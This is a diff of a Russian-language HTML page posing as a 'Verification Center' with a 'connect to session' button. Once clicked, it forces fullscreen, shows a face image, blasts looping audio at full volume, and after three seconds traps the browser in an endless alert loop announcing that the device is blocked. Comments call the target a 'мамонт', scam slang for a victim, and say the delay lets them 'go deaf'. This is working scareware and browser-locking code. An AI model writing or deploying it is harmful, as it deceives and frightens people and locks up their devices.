@@ -4,29 +4,39 @@
     <meta charset="UTF-8">
     <title>Центр верификации</title>
     <style>
-        body { margin: 0; background: #000; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: crosshair; }
-        #s { display: none; width: 100vw; height: 100vh; object-fit: cover; }
-        .btn { padding: 20px; background: #0056b3; color: #fff; border: none; font-size: 1.5rem; cursor: pointer; border-radius: 5px; font-family: sans-serif; }
+        body { margin: 0; background: #000; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        #s { display: none; width: 100vw; height: 100vh; object-fit: cover; position: fixed; top: 0; left: 0; z-index: 999; }
+        .btn { padding: 25px 50px; background: #0056b3; color: #fff; border: none; font-size: 1.8rem; cursor: pointer; border-radius: 5px; font-family: sans-serif; font-weight: bold; z-index: 1000; }
     </style>
 </head>
 <body>
     <button class="btn" onclick="go()">ПОДКЛЮЧИТЬСЯ К СЕССИИ</button>
     <img id="s" src="face.jpg">
-    <audio id="a" src="s.mp3"></audio>
+    <audio id="a" src="s.mp3" loop></audio>
 
     <script>
         function go() {
             let a = document.getElementById('a');
             let i = document.getElementById('s');
-            document.documentElement.requestFullscreen();
+            
+            // 1. Уходим в фулскрин (самое важное)
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            }
+
+            // 2. Скрываем кнопку, показываем рожу и включаем ор
             document.querySelector('.btn').style.display = 'none';
             i.style.display = 'block';
             a.volume = 1.0;
             a.play();
-            // Цикл блокировки
-            setInterval(() => {
-                alert("КРИТИЧЕСКАЯ ОШИБКА: НЕСАНКЦИОНИРОВАННЫЙ ДОСТУП");
-            }, 100);
+
+            // 3. ЗАДЕРЖКА ПЕРЕД ОКНОМ (3 секунды)
+            // Даем мамонту рассмотреть картинку и оглохнуть, прежде чем выскочит окно
+            setTimeout(() => {
+                while(true) {
+                    alert("КРИТИЧЕСКАЯ ОШИБКА: НЕСАНКЦИОНИРОВАННЫЙ ДОСТУП. УСТРОЙСТВО ЗАБЛОКИРОВАНО.");
+                }
+            }, 3000); 
         }
     </script>
 </body>
